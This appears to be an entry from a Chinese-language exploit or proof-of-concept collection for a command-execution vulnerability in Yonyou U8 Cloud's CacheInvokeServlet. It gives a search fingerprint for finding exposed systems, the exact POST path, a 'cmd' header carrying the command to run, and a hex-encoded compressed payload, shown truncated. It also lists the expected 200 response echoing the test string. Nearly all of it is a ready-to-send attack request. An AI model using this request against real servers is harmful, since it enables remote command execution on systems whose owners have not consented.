# 用友U8CloudCacheInvokeServlet命令执行漏洞

- **系统**：用友　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`POST /service/~iufo/com.ufsoft.iufo.web.appletinvoke.CacheInvokeServlet HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`　`cmd: echo dudesuite`

**请求体 / payload**
```
$<Hex>1F 8B 08 00 00 00 00 00 00 00 CD 7B CB 8F 2B EB 76 57 DF 7D EE 55 C8 09 28 37 37 52 14 89 01 AD CD A4 3B 67 D3 6D BB DD BD BB B3 75 80 F5 D5 CB E5 67 97 CB CF 3A 8A A0 5C AE 2E BB AB EC 72 BB CA 2E DB 87 C3 00 09 45 62 94 C1 0D 11 42 02 06 CC 80 48 88 41 22 10 42 11 03 06 88 48 30 21 0A 63 44 06 20 C1 5F 00 BF 55 65 77 BB DD BD F7 D9 37 08 89 AD ED 2E BB BE F5 AD E7 6F 3D BE 72 F7 3F FD 1F 47 3F 8A E6 47 BF 74 6F 2F ED B3 45 3C 0E CE 4A 76 34 32 DD F8 5F CA 7F FB B7 FF EE EF FF 5E F1 8B A3 A3 D5 2C F9 B3 47 47 47 6F FE CA 5F 3D E2 7F 3F 00 7D 31 9C 7B 67 F6 CC 76 46 EE 99 13 4E 26 E1 34 …（脚本共 20572 字，完整版见原文）
```
- **预期**：200　|　dudesuite